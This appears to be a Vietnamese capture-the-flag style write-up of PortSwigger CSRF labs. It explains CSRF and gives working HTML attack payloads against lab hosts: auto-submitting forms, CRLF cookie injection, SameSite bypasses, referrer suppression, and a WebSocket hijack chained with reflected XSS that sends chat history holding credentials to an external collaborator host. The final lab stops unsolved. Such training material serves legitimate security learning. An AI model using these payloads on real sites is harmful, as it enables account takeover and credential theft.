---
title: PortSwigger CSRF Challenge WriteUps
categories: [pentesting, Web-Exploitation]
tags: [Web, PortSwigger]
---

# PortSwigger CSRF Challenge WriteUp

### Giới thiệu về CSRF (Cross-Site Request Forgery)

#### Lỗ hổng CSRF là gì :

- Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một lỗ hổng bảo mật cho phép attacker lừa người dùng đã được xác thực (đã đăng nhập) thực hiện các hành động không mong muốn trên 1 ứng dụng Web.
- Nói đơn giản thì attacker sẽ mượn danh tính và session của một victim để gửi đi một yêu cầu giả mạo đến ứng dụng mà victim không hề hay biết. Nếu ứng dụng dễ bị tấn công, nó sẽ không thể phân biệt được đâu là yêu cầu giả mạo đâu là yêu cầu hợp lệ của victim (User).

#### CSRF hoạt động như thế nào :

- Để thực hiện tấn công CSRF cần có 3 điều kiện bao gồm :
    - Hành động quan trọng : Ứng dụng phải có một function (hành động, action) mà attacker muốn thực hiện ví dụ như là đổi mật khẩu, đổi username, đổi email, chuyển tiền,…. Nói chung nó có lợi có attacker là tương hết hay còn gọi là attack surface ngon, nhiều.
    - Xử lý request dựa trên cookie, session : Application phải chỉ dựa vào cookie của trình duyệt để xác định người dùng đang gửi yêu cầu. Không có cơ chế nào xác minh request.
    - Không có tham số không thể đoán trước : Các tham số trong yêu cầu thực hiện hành động phải là những giá trị mà attacker có thể đoán trược hoặc là biết trước.
    
#### Tại sao lỗ hổng này tồn tại :
    
- Lỗ hổng CSRF tồn tại do sự tin tưởng của ứng dụng web vào các cookie mà trình duyệt tự động gửi kèm theo mỗi yêu cầu. Ứng dụng chỉ kiểm tra "ai" đang gửi yêu cầu (dựa trên cookie session) mà không kiểm tra "ý định" của người dùng có thực sự muốn thực hiện hành động đó hay không.

![image](https://hackmd.io/_uploads/ByFpDfMx-x.png)

### Challenge WriteUp

### Lab: CSRF vulnerability with no defenses

```text 
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter
```

![image](https://hackmd.io/_uploads/ByZYdfMxbg.png)

Đăng nhập với user được cấp sẵn ở đây ta thấy nó có một chức năng đó là update email mà dựa theo description của lab thì nó muốn ta đổi email của người đọc bài ở đây ta sẽ lợi dụng chức năng update này để làm thử.

![image](https://hackmd.io/_uploads/BJkLFzGg-g.png)

Hmm thành công tương tác và thay đổi được email address. Taị đây ta có thể tự viết payload CSRF hoặc có thể tận dụng chức năng tạo payload có sẵn của burp pro ở đây mình sẽ dùng thử chức năng `generate CSRF POC`.

![image](https://hackmd.io/_uploads/B1mA_hzxWe.png)

![image](https://hackmd.io/_uploads/S1ZlK3flWl.png)

Thành công tạo ra payload html bây giờ ta sẽ sửa một tí ở trường value vì email này mình đã tạo trước nên có sẵn sợ nó không exploit được ta đổi sang 1 email mới.

![image](https://hackmd.io/_uploads/rJPBt3Mebx.png)

Sau đó paste vào exploit server được cấp sẵn của lab và tiến hành store sau đó gửi đi cho victim và thành công với lab đầu tiên.

![image](https://hackmd.io/_uploads/BJ6vthGeWl.png)

### Lab: CSRF where token validation depends on request method

```text 
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter
```

![image](https://hackmd.io/_uploads/B1arxTfxbx.png)

Vẫn là chức năng update email như cũ những lần này nó có thêm 1 cái param đó là `csrf` nhưng có vẻ nó không thay đổi nhiều bây giờ ta thử cách ta đã làm ở lab đầu tiên xem như thế nào.

![image](https://hackmd.io/_uploads/H1a3eTGgWx.png)

Thử với exploit cũ xem có thành công không, sau một lúc store với delivery đến victim ta thấy rằng exploit server chả trả cái gì về nên có vẻ exploit cũ không còn hiệu quả ở đây.

Ta tiến hành thử thay đổi giá trị trường `csrf` một chút xem thử kết quả nó sẽ như nào.

![image](https://hackmd.io/_uploads/BJ5bGpMxbg.png)

Okay khi thay đổi csrf là bị ăn chửi liền hmm vậy nếu trong trường hợp này ta thay đổi HEADER thì liệu cái trường csrf còn hiệu quả không ta? Test thôi.

![image](https://hackmd.io/_uploads/Sy0NMpGg-l.png)

Ô có vẻ như khi thay đổi header thì csrf không còn được áp dụng nữa ở đây với header là GET ta đã không còn bị ăn chửi nữa vậy đây là attack surface cho ta rồi bây giờ tiến hành generate csrf POC thôi.

![image](https://hackmd.io/_uploads/rym3fTzlWe.png)

Thay đổi một chút ở email thành email khác tránh lỗi.

![image](https://hackmd.io/_uploads/Bk_Jmazgbg.png)

![image](https://hackmd.io/_uploads/rywgmpzeZl.png)

Store và gửi cho nạn nhân và thành công solve lab này.

### Lab: CSRF where token validation depends on token being present

```text 
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter
```

![image](https://hackmd.io/_uploads/SyZcBaflZg.png)

Đến với lab 3 thì vẫn là chức năng update email như cũ bây giờ ta tiếp tục bắt request để test từng case một thôi.

![image](https://hackmd.io/_uploads/B1DdUaMlWe.png)

Vẫn là request ấy bây giờ thử đổi header như ở lab trước xem thử có còn work không.

![image](https://hackmd.io/_uploads/H122Uazg-l.png)

Xong ăn chửi rồi có vẻ như dev đã fix lại bây giờ tìm thử cách khác xem sao. Dựa vào đề lab thì nó kêu dựa theo token vậy ta thử thay đổi token csrf xem thử sao.

![image](https://hackmd.io/_uploads/r1VnP6GgWe.png)

Well vẫn bị ăn chửi, bây giờ ta sẽ thử xoá luôn cái trường csrf xem thử nó nói như nào.

![image](https://hackmd.io/_uploads/ry4yOpfg-x.png)

Ngon rồi sau khi xoá đi trường csrf thì server trả về 302, có vẻ như anh dev quên sửa lại phải bắt buộc có trường csrf trên mỗi request nên với trường hợp này tuy xoá đi trường csrf token thì ta vẫn có thể thực hiện chức năng như bình thường bây giờ thì lặp lại bước tạo csrf POC như cũ thôi.

![image](https://hackmd.io/_uploads/B1fud6Gebe.png)

Quăng cái exploit code vào bên exploit server.

![image](https://hackmd.io/_uploads/HylqO6zxZe.png)

Store và gửi cho nạn nhân và ta thành công solve lab thứ 3.

### Lab: CSRF where token is not tied to user session

```text 
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya
```

Đến với lab này nó cấp cho ta 2 accounts chưa biết để làm gì thôi thì ta tiến hành tạo 2 tabs để truy cập 2 acc cho nhanh.

![image](https://hackmd.io/_uploads/SJSpuRfxZx.png)

![image](https://hackmd.io/_uploads/S1RaOCzlZg.png)

Ở đây thì ta vẫn có chức năng đó là update email như cũ không thay đổi bây giờ ta thử bắt request xem có gì xảy ra.

![image](https://hackmd.io/_uploads/HJkPYAGlZg.png)

Sau khi có request mình có thử thay đổi csrf token xem có gì không nhưng kết quả vẫn là ăn chửi bây giờ thử xoá như ở lab trước xem có hiệu quả ở đây không.

![image](https://hackmd.io/_uploads/Hy9cFRze-l.png)

Okay có vẻ như anh Dev đã fix đoạn này lại nếu thiếu đi csrf token thì sẽ không thực hiện bất kì chức năng nào, bây giờ ta sẽ check thử luồng xử lý của request nó xảy ra như thế nào.

![image](https://hackmd.io/_uploads/r1hF20zgbe.png)

Ở đây ta để ý rằng mỗi lần ta tạo một request là nó sẽ khởi tạo một CSRF token khác và tự gán value vào trong đó hmm vậy nếu ta lợi dụng Token của account khác để gắn cho account kia thì sẽ như nào.

![image](https://hackmd.io/_uploads/rymVTAMgZe.png)

Ở đây ta tiến hành tạo một request thay đổi email của user carlos, sau đó ta cũng sẽ tiến hành đổi ở bên user wiener bằng csrf token vừa mới tạo của carlos. Ở đây ta làm từng bước 1 tránh lỗi.

![image](https://hackmd.io/_uploads/SJ1SC0Mg-l.png)

Đăng nhập user wiener sau đó note lại CSRF token đã được tạo. Sau đó tạo một tab ẩn danh và tiến hành đăng nhập user carlos sau đó tiến hành thử request update email từ user carlos.

![image](https://hackmd.io/_uploads/B15D1JXg-l.png)

Sau khi request phát nữa ta thấy rằng csrf của carlos đã hết hiệu lực bây giờ ta thử đổi sang token mà ta đã note của user wiener.

![image](https://hackmd.io/_uploads/Hk12y1Ql-x.png)

Ngon đét luôn server trả về 302 là thực thi thành công rồi vậy là ta đã thành công lợi dụng token của user wiener để thay đổi email của user carlos bây giờ ta sẽ tiến hành repeat lại request của wiener để lấy token mới để tạo payload.

![image](https://hackmd.io/_uploads/HJSMx1Xl-l.png)

Có token bây giờ ở request đổi email của user carlos ta lặp lại bước generate csrf POC như mấy lab trước.

![image](https://hackmd.io/_uploads/rkBdgJQeWl.png)

Đây là payload hoàn chỉnh sau khi tạo và sửa email cùng với đó là nhét token mới bây giờ ném nó lên exploit server thôi.

![image](https://hackmd.io/_uploads/rk43xJmx-l.png)

Vậy là hoàn thành lab này ở lab này đã cho ta biết được cách lợi dụng token của người khác để tấn công.

### Lab: CSRF where token is tied to non-session cookie

```text 
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya
```

Vẫn như cũ nó cấp cho ta 2 tài khoản bây giờ vẫn như bài trước ta sẽ đăng nhập wiener trước rồi đăng nhập carlos ở tab ẩn danh sau.

![image](https://hackmd.io/_uploads/S1oxibQxWg.png)

Ta vẫn thử lấy CSRF token của wiener như bài trước xem thử cách lab trước có hoạt động nữa không.

![image](https://hackmd.io/_uploads/H1qFoWmeZl.png)

Sau khi đăng nhập carlos tôi để ý ở đây còn có trường csrfKey nên có vẻ cách cũ không còn khả thi nữa và tương tự ở user wiener cũng có csrfKey ồh vậy có 2 key ta có thể thử inject cả 2 vào xem kết quả.

![image](https://hackmd.io/_uploads/r10LnZ7lZx.png)

Lấy 2 key này ta thử inject vào request change email của carlos xem có trả về 302 không.

![image](https://hackmd.io/_uploads/B1_j2WXgWg.png)

Request trả về 302 có vẻ như ngon lành rồi giờ ta sẽ tìm nơi có thể bỏ payload vào.

![image](https://hackmd.io/_uploads/ByC0n-Xxbe.png)

Tôi để ý rằng ở đây có một thanh chức năng để search các blog và có vẻ như nó không có lớp filter nào

![image](https://hackmd.io/_uploads/SJSYa-mgbg.png)

Ok chuẩn rồi chức năng search khá là bình thường và không có filter bây giờ ta sẽ thử inject vào ngay query `search?`.

![image](https://hackmd.io/_uploads/S1jPRZmlZg.png)

Ở đây tại session của user wiener ta thử inject vào csrfKey của user carlos ta để ý rằng cookie đã được inject thành công và làm thay đổi key vốn có của nó. Sau đó ta sẽ dùng chức năng generate csrf POC và inject thêm đoạn url lúc thực hiện search.

```html 
<html>
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a4900800301408c80a4764300ae0048.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="Ilz8s2nL5dWzDPrAL1BnE1ajXodlMRXr">
      <input type="submit" value="Submit request">
    </form>
    <img src="https://0a4900800301408c80a4764300ae0048.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=JrfQnHRIFju4I8OnsQ9jXaodFOnPIvWX%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

Payload nó sẽ như thế này.

![image](https://hackmd.io/_uploads/rkjhZzmgZg.png)

Thành công pass lab.

### Lab: CSRF where token is duplicated in cookie

```text 
This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter
```

![image](https://hackmd.io/_uploads/S1ODEMml-e.png)

Lại vẫn là chức năng update email đó bây giờ ta sẽ test thử với trường `csrf` xem có tương tác gì với nó được không.

![image](https://hackmd.io/_uploads/B1q3VMQlWx.png)

Lúc đầu thử đổi sang abc123 nhưng nó báo invalid sau đó mình đổi thêm ở bên dưới thì kết quả thì nó lại trả 302 khá ảo có vẻ nó bị duplicate rồi như đề bài nói.

![image](https://hackmd.io/_uploads/H18-UG7g-x.png)

Ở đây ta có chức năng `search` chắc lấy lại payload cũ test thử.

![image](https://hackmd.io/_uploads/S1nOLMmxZl.png)

Ngon lành rồi ta nhét thử csrf tự chế vào mà nó vẫn inject vào oke bây giờ ta sẽ lấy payload cũ của bài trước rồi sửa chút để exploit.

```html 
<html>
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a9d00c904e3730980189ad600830017.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="abc123">
    </form>
    <img src="https://0a9d00c904e3730980189ad600830017.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abc123%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```

![image](https://hackmd.io/_uploads/rySawGQgbl.png)

Thành công khai thác lab này.

### Lab: SameSite Lax bypass via method override

![image](https://hackmd.io/_uploads/rkqCuXQgWx.png)

Vào thẳng request luôn thì ta thấy rằng các trường csrf đã bị xoá hết có vẻ như không có gì để lợi dụng ngoài cái cookie session được cấp ở đây.

Ở đây có hint là về SameSite tham khảo ở đây <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions>.

Giải thích nôm na thì : 

- Cookie là một đoạn dữ liệu nhỏ mà website lưu vào trình duyệt của bạn, thường dùng để giữ trạng thái đăng nhập. Tuy nhiên, nếu trình duyệt tự động gửi cookie khi bạn truy cập từ một trang web khác, thì hacker có thể lợi dụng điều này để thực hiện tấn công CSRF.
- Để ngăn chặn điều đó, trình duyệt có thêm thuộc tính SameSite khi website đặt cookie.

Ở đây khi nhìn vào request response ta không hề thấy thuộc tính `SameSite=Strict` thì có lẽ mình có thể bypass được SameSite này vì có vẻ như nó xài LAX.

![image](https://hackmd.io/_uploads/Hy1Q67mxbe.png)

Ở đây ta sẽ tiến hành thay đổi method thành GET thì kết quả trả về rằng nó chỉ allow mỗi POST thôi có vẻ đó là lớp bảo vệ của SameSite, bây giờ ta sẽ thử vài trick để bypass nó.

![image](https://hackmd.io/_uploads/SkwPT7mxWl.png)

Ở đây ta sử dụng cách Overiding method thì thành công bypass được lớp filter đó vậy là ta hoàn toàn có thể từ đây lợi đụng để tạo payload cho exploit server.

```html 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a6800e303a7b0b4807c6735003e0042.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="moimoimoi&#64;hacker&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
    document.location = "https://0a6800e303a7b0b4807c6735003e0042.web-security-academy.net/my-account/change-email?email=aloaloalo@phatmai.net&_method=POST";
</script>
  </body>
</html>
```

Giải thích cơ chế : 

- Thực hiện một cuộc tấn công CSRF để thay đổi địa chỉ email của nạn nhân trên website mục tiêu, bằng cách lợi dụng việc trình duyệt Chrome vẫn gửi cookie trong các yêu cầu GET có điều hướng cấp cao (top-level navigation), ngay cả khi cookie có thuộc tính SameSite=Lax.

![image](https://hackmd.io/_uploads/HkZcRXQgWl.png)

Thành công solve lab này.

### Lab: SameSite Strict bypass via client-side redirect

```text 
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter
```

Như tiều đề ta đã đọc có vẻ như nó vẫn xài SameSite để bảo vệ và lần này thì nó xài đến `Strict` nên ta sẽ tìm cách bypass với thuộc tính là `SameSite:Strict`.

![image](https://hackmd.io/_uploads/HJ4UDVQgZg.png)

Sau khi login thì ta có thể thấy luôn dòng `Secure; HttpOnly; SameSite=Strict` khẳng định nó đã áp dụng vào đây bây giờ ta sẽ tìm hiểu các request tiếp theo vì ở đây ta biết rằng là `Strict` sẽ chặn hết tất cả các request cùng chung 1 site.

![image](https://hackmd.io/_uploads/HyvxoOXeWe.png)

Nhìn vào request update email có vẻ như chẳng có cái gì được mỗi cái cookie session nhưng ở site này nó đã dùng `Same-Site: Strict` nên cách tấn công của lab trước không còn khả thi nữa. Nên ta sẽ phải tìm một nơi mà payload cookie của mình được redirect đi ta phải tìm cái gadget.

![image](https://hackmd.io/_uploads/Bklf2_mlZx.png)

Ở đây ta phát hiện rằng nó có chức năng post comment lên một bài viết nào đó, ý tưởng ở đây là : 

- Khi bạn bình luận vào bài viết, bạn được chuyển đến /post/comment/confirmation?postId=x.

- Sau vài giây, JavaScript sẽ redirect đến /post/x.

- Nếu bạn chỉnh postId=1/../../my-account, thì redirect sẽ đến /my-account

Đây là cách để lợi dụng client-side redirect từ trong chính domain nên không lo ăn filtet strict của same site 

![image](https://hackmd.io/_uploads/BJapTdXg-x.png)

Ta thử inject đoạn string nào đó sau đó thực hiện path traversal để redirect về `/my-account` ở đây ta có thể thấy nó trả về đoạn script là `redirectOnConfirmation('/post');` nó đóng phần khẳng định rằng sau khi đường dẫn được chuẩn hoá thì nó sẽ được redirect về nơi mình mong muốn.

Rồi bây giờ dựa vào kết quả trên ta sẽ tạo payload như những lab trước.

```html 
<script>
    document.location = "https://0ada005803ea228080fb62da00320029.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hackerlord%40web-security-academy.net%26submit=1";
</script>
```

Sau đó ta tạo payload CSRF thay từ request thay đổi email bằng generate csrf POC.

```html 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0ada005803ea228080fb62da00320029.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="phat&#64;hacker&#46;com" />
      <input type="hidden" name="submit" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
    document.location = "https://0ada005803ea228080fb62da00320029.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hackerlord%40web-security-academy.net%26submit=1";
    </script>
  </body>
</html>
```

![image](https://hackmd.io/_uploads/HklfeYXgZe.png)

Thành công solve lab này.

### Lab: SameSite Strict bypass via sibling domain

```text 
This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.
```

![image](https://hackmd.io/_uploads/H1Gm6t7eZl.png)

Ở lab này ta có chức năng chat chít với websockets bây giờ ta thử chat vài câu xem nó sẽ ra request như thế nào.

![image](https://hackmd.io/_uploads/Sk5yg9Qgbl.png)

Sau khi chat ta chạy sang đống websocket history và thấy rằng ở đây ta có một request ready để bắt đầu chat với live chat bây giờ đưa nó vào repeater và send nó thử xem kết quả ra sao.

![image](https://hackmd.io/_uploads/HJz4e5Xx-l.png)

Nó hiện ra những gì ta đã nhắn với nó ở đây mình trash talk với cái này khá nhiều :v 

Ta để ý với request khi gọi đến chat ta có trường Switching Protocol cùng với đó là websocket và chức năng chat này có bị dính CSRF vì ngoài ra nó còn có thêm cả key.

![image](https://hackmd.io/_uploads/ry0Ufcmebe.png)

![image](https://hackmd.io/_uploads/HJGnzcmgZe.png)

Bên cạnh đó ta còn tìm thấy được URL của chat form của lab đó là `https://0a0d004904e114468051037300ff00aa.web-security-academy.net/chat` ngoài ra ở bên dưới ta còn có cả `resouces/js/chat.js` 

![image](https://hackmd.io/_uploads/SyTsX57ebx.png)

Truy cập vào ta thấy ở đây có một cái Event Handler newSocket.

![image](https://hackmd.io/_uploads/rJrlEq7xbx.png)

Ngoài ra đây còn có cả nơi để handle message, ta hoàn toàn có thể lợi dụng cái này để exfiltrate đến endpoit mà ta điều khiển nên ta sẽ lấy đoạn code đó về để tạo payload thử.

```html 
<script>
    var ws = new WebSocket('wss://0a0d004904e114468051037300ff00aa.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://d9nxjng7bthxpmcwzcspvjxr2i89wzko.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Với payload này ta gửi thử cho exploit server xem thử liệu nó có nhận được ready chat không.

![image](https://hackmd.io/_uploads/SkCOH9Qx-x.png)

Vậy là ta xác thực được rằng bên phía server nhận được lệnh ready để tạo con chatbot session rồi.

![image](https://hackmd.io/_uploads/SJ-qO97e-x.png)

Ở đây ta tìm thấy một sibling web với web mà ta đang cố exploit bên cạnh đó nó còn có thuộc tính là `Access-Control-Allow-Origin` vậy thì 2 cái này không còn dính hạn chế của Same Site `https://cms-0a0d004904e114468051037300ff00aa.web-security-academy.net` ta sẽ truy cập web này xem có attack surface không.

![image](https://hackmd.io/_uploads/BJafK5mxWg.png)

Truy cập vào ta thấy một trang login khá đơn giản bây giờ test thử xem có XSS không ta sẽ inject js vào username xem sao.

![image](https://hackmd.io/_uploads/ryT8F9Xxbe.png)

![image](https://hackmd.io/_uploads/Skt6Kc7x-l.png)

Okay nó dính XSS thật và đây ta có một bug reflected XSS ta thấy rằng alert(1) đã được call lên bây giờ ta thử đổi method khác xem liệu nó còn thực thi được XSS không.

![image](https://hackmd.io/_uploads/B1pmqcQxZx.png)

Ta sẽ tiến hành copy URL của request này và paste ra browser xem thử có còn reflect XSS không.

![image](https://hackmd.io/_uploads/SypUq57l-g.png)

Với GET method thì XSS vẫn hoạt động vậy là ta có nơi để exploit rồi bây giờ ta lợi dụng reflected XSS để nhét payload trước mình đã dùng để xem có phản ứng gì.

```html
<script>
    var ws = new WebSocket('wss://0a0d004904e114468051037300ff00aa.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://sa6ck2hmc8icq1db0rt4wyy63x9oxgl5.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![image](https://hackmd.io/_uploads/S1nti5QlWe.png)

Tiến hành URL encode hết đống này để tránh lỗi sau đó ta tạo thêm một script để có thể inject đến domain sibling mà dính XSS.

```html 
<script>
    document.location = "https://cms-0a0d004904e114468051037300ff00aa.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%30%64%30%30%34%39%30%34%65%31%31%34%34%36%38%30%35%31%30%33%37%33%30%30%66%66%30%30%61%61%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%73%61%36%63%6b%32%68%6d%63%38%69%63%71%31%64%62%30%72%74%34%77%79%79%36%33%78%39%6f%78%67%6c%35%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=lmao";
</script>
```

Ném nó lên exploit server xem thử nó có gửi response về burp collab không.

![image](https://hackmd.io/_uploads/SkXc3cQe-l.png)

Thành công bịp chat để lấy được username password của carlos.

![image](https://hackmd.io/_uploads/BkN635XgZl.png)

Login vào là hoàn thành bài lab.

### Lab: SameSite Lax bypass via cookie refresh

```text 
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

Note
The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:

<script>
    window.onclick = () => {
        window.open('about:blank')
    }
</script>
```

![image](https://hackmd.io/_uploads/SJBINrVxWx.png)

Đến với lab này thì vẫn là chức năng update email bị lỗi bây giờ ta thử update bắt request xem có nhưng gì được xử lý.

![image](https://hackmd.io/_uploads/HyA_HHNl-l.png)

Ta để ý rằng ở trong request thay đổi email này thì phần response đã khác với lab trước, ở đây request có nội dung này không chứa bất token không thể đoán trước nào, do đó có thể dễ bị tấn công bởi CSRF trong trường hợp ta có thể bypass bất kỳ hạn chế cookie SameSite nào.

![image](https://hackmd.io/_uploads/Skj0IB4gWg.png)

Ta kiểm tra request call back của Oauth ở trường set-cookie ta thấy rằng không còn `Same-Site: Strict` nữa vậy nên ta có thể kết luận rằng nó sử dụng default của browser là LAX và LAX thì có cách để bypass được.

Bây giờ ta tạo một cái exploit để đổi email thử xem có hoạt động không.

```html 
<script>
    history.pushState('', '', '/')
</script>
<form action="https://0ae200dc040bb8cd816f2022002a00ea.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="phatmai@hack.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

![image](https://hackmd.io/_uploads/rJv5xO4l-l.png)

Thành công solve lab, tại exploit ta sẽ phải gửi 2 lần lý do là vì SameSite default có lỗ hổng ở chrome browser khi đến bước SSO thì chrome sẽ không kiểm tra cookie trong 120 giây trong khoảng thời gian đó ta lợi dụng được fresh cookie gửi đi payload và khi victim ấn vào thì nó sẽ tiến hành đổi email ở phía server.

### Lab: CSRF where Referer validation depends on header being present

```text 
This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.
```

![image](https://hackmd.io/_uploads/ryEvQONg-g.png)

Ta vẫn có chức năng update email như cũ bây giờ ta tiến hành update và lấy request của nó để phân tích.

![image](https://hackmd.io/_uploads/SJDCXd4ebl.png)

Ta để ý rằng ở đây không hề có token csrf nên dễ bị tấn công, Server cố gắng chống CSRF bằng cách kiểm tra Referer header:

- Nếu Referer khác domain → từ chối.

- Nhưng nếu không có Referer header → lại chấp nhận (fallback insecure).

Ta sẽ thử sửa cái domain ở trường Referer để xem kết quả nó có đúng như ta nghĩ không.

![image](https://hackmd.io/_uploads/HJ6BNdVgZl.png)

Rồi ăn chửi rồi, bây giờ nếu ta xoá luôn nó đi thì sẽ như thế nào.

![image](https://hackmd.io/_uploads/S1WuNu4e-g.png)

Response thành công trả về 302, nó chấp nhận request của ta mặc dù không còn trường Referer nữa. Điều này chứng minh: cơ chế phòng thủ chỉ kiểm tra khi header tồn tại, còn nếu không có thì bỏ qua.

Bây giờ dựa vào đó ta sẽ tạo một payload Suppress Referer bằng HTML meta tag.

```html 
<meta name="referrer" content="no-referrer">
```

```html 
<meta name="referrer" content="no-referrer">
<form action="https://0a7600bd04925cac806c5394009300d1.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="phatmaiii@evil.com" />
</form>
<script>
    document.forms[0].submit();
</script>
```

![image](https://hackmd.io/_uploads/rkLGSdNxbe.png)

Store payload và gửi nó đến cho victim khi victim bấm vào request đổi email sẽ được thực thi đến server.

![image](https://hackmd.io/_uploads/Sk3NH_VgZg.png)

Thành công solve lab này.

### Lab: CSRF with broken Referer validation

Đây là lab cuối cùng của CSRF.

```text 
This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.
```

![image](https://hackmd.io/_uploads/r1lxL_Vx-g.png)

Ta vẫn sẽ có chức năng update email như bao lab trước bây giờ như cũ ta vẫn sẽ lấy request update email để phân tích và tìm cách để tạo payload.

![image](https://hackmd.io/_uploads/HklD8uVgWe.png)

Ok ở đây ta có kịch bản khá là giống bài lab trước bây giờ ta sẽ thử xoá luôn trường Referer xem kết quả ra sao.

![image](https://hackmd.io/_uploads/rJs5UdExWe.png)

Ok ăn chửi rồi thế với trường hợp ta thử sửa domain trong trường referer thì sao?

![image](https://hackmd.io/_uploads/SkICUuVe-l.png)

